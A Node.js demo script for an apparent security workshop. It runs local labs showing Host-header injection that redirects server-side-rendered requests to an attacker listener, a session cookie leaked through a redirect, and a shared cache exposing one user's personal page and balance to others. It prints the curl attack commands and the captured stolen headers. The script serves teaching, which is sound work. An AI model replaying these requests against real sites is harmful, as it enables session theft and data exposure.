// Labs 2, 3 and 4 without typing curl on stage. Needs the stack running (npm start).
//   node tools/labs.mjs host       Lab 2: the Host header steers SSR requests
//   node tools/labs.mjs redirect   Lab 3: a custom header follows a redirect
//   node tools/labs.mjs cache      Lab 4: Ana's render served to someone else
import { captures, clearCaptures, rawGet, signIn } from './client.mjs';

const RED = '\x1b[31m';
const GREEN = '\x1b[32m';
const DIM = '\x1b[2m';
const BOLD = '\x1b[1m';
const RESET = '\x1b[0m';

const labs = { host, redirect, cache };
const name = process.argv[2];
if (!labs[name]) {
  console.error(`Usage: node tools/labs.mjs <${Object.keys(labs).join('|')}>`);
  process.exit(1);
}

try {
  await labs[name]();
} catch (error) {
  // fetch() puts the socket error in `cause`; node:http does not.
  if ((error.cause ?? error).code === 'ECONNREFUSED') {
    console.error('The stack is not running. Start it with "npm start" or "npm run start:safe".');
    process.exit(1);
  }
  throw error;
}

async function host() {
  await clearCaptures();
  command('curl -H "Host: 127.0.0.1:9999" http://localhost:4000/deals');
  const res = await rawGet(`/deals?t=${Date.now()}`, { host: '127.0.0.1:9999' });
  console.log(
    `HTTP ${res.status}${res.status === 400 ? `  ${DIM}${res.body.trim()}${RESET}` : ''}`,
  );
  if (res.body.includes('iPhone 17 Pro')) {
    console.log(`${RED}The page your server rendered shows the attacker's deal.${RESET}`);
  }
  await printCaptures();
}

async function redirect() {
  const sid = await signIn('ana');
  await clearCaptures();
  command('curl -b "sid=$ANA" http://localhost:4000/deals');
  const res = await rawGet(`/deals?t=${Date.now()}`, { cookie: `sid=${sid}` });
  if (res.body.includes('Deals unavailable')) {
    console.log(`${GREEN}Deals unavailable: the redirect was refused.${RESET}`);
  } else if (res.body.includes('iPhone 17 Pro')) {
    console.log(`${RED}The page shows whatever the campaign site serves now.${RESET}`);
  }
  await printCaptures();
}

async function cache() {
  const sid = await signIn('ana');
  // A fresh URL each run, so the 60 s edge cache from a previous run does not get in the way.
  const path = `/?t=${Date.now()}`;

  command('curl -b "sid=$ANA" http://localhost:4000/');
  const ana = await rawGet(path, { cookie: `sid=${sid}` });
  console.log(
    `x-cache: ${ana.headers['x-cache']}   cache-control: ${ana.headers['cache-control']}`,
  );

  command('curl http://localhost:4000/');
  const visitor = await rawGet(path, {});
  const leaked = visitor.body.includes('Ana Quispe');
  console.log(
    `x-cache: ${visitor.headers['x-cache']}   ` +
      (leaked
        ? `${RED}${BOLD}Hi, Ana Quispe${RESET} ${RED}(and her balance, in the HTML and in ng-state)${RESET}`
        : `${GREEN}no trace of Ana${RESET}`),
  );
}

// --- helpers ----------------------------------------------------------------

function command(value) {
  console.log(`\n${GREEN}$${RESET} ${value}`);
}

async function printCaptures() {
  const entries = await captures();
  if (!entries.length) {
    console.log(`${GREEN}[attacker] nothing arrived${RESET}`);
    return;
  }
  for (const entry of entries) {
    const stolen = Object.entries(entry.headers)
      .map(([key, value]) => `${key}=${value}`)
      .join('  ');
    console.log(
      `${RED}[attacker]${RESET} ${entry.method} ${entry.url}  ${stolen || DIM + '(nothing interesting)' + RESET}`,
    );
  }
}
